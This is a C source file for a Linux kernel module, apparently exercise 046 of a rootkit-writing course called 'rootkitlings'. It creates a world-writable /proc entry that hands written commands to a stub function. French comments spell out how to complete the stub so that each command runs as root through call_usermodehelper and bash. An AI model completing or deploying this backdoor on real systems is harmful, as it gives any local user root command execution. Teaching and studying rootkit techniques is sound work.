#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/umh.h>
#include <linux/slab.h>

#define PROC_NAME  "rootkitlings_cmd"
#define OUTPUT_FILE "/tmp/rkl_out"
#define CMD_MAX    256

static struct proc_dir_entry *proc_entry;

static int exec_cmd(const char *cmd)
{
	// TODO(rootkitlings): execute cmd via call_usermodehelper.
	//
	// 1. Cree la chaine complete: "CMD > /tmp/rkl_out 2>&1"
	//    Utilise un buffer de 512 octets et snprintf.
	//
	// 2. Definis argv: {"/bin/bash", "-c", buffer, NULL}
	//
	// 3. Definis envp: {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL}
	//
	// 4. Appelle call_usermodehelper("/bin/bash", argv, envp, UMH_WAIT_PROC)
	//
	// 5. Retourne le resultat.
	//
	// 8 lignes de code.

	return -1;
}

static ssize_t proc_write(struct file *file, const char __user *ubuf,
			   size_t count, loff_t *ppos)
{
	char cmd[CMD_MAX];
	size_t len;
	int ret;

	len = min(count, (size_t)(CMD_MAX - 1));
	if (copy_from_user(cmd, ubuf, len))
		return -EFAULT;
	cmd[len] = '\0';

	/* Strip trailing newline */
	if (len > 0 && cmd[len - 1] == '\n')
		cmd[len - 1] = '\0';

	pr_info("rootkitlings/046: executing: %s\n", cmd);
	ret = exec_cmd(cmd);
	pr_info("rootkitlings/046: call_usermodehelper returned %d\n", ret);

	return count;
}

static const struct proc_ops proc_fops = {
	.proc_write = proc_write,
};

static int __init execmd_init(void)
{
	proc_entry = proc_create(PROC_NAME, 0222, NULL, &proc_fops);
	if (!proc_entry) {
		pr_err("rootkitlings/046: failed to create /proc/%s\n", PROC_NAME);
		return -ENOMEM;
	}
	pr_info("rootkitlings/046: /proc/%s created, write a command to execute\n",
		PROC_NAME);
	return 0;
}

static void __exit execmd_exit(void)
{
	proc_remove(proc_entry);
	pr_info("rootkitlings/046: removed\n");
}

module_init(execmd_init);
module_exit(execmd_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("rootkitlings 046: execute commands via call_usermodehelper");
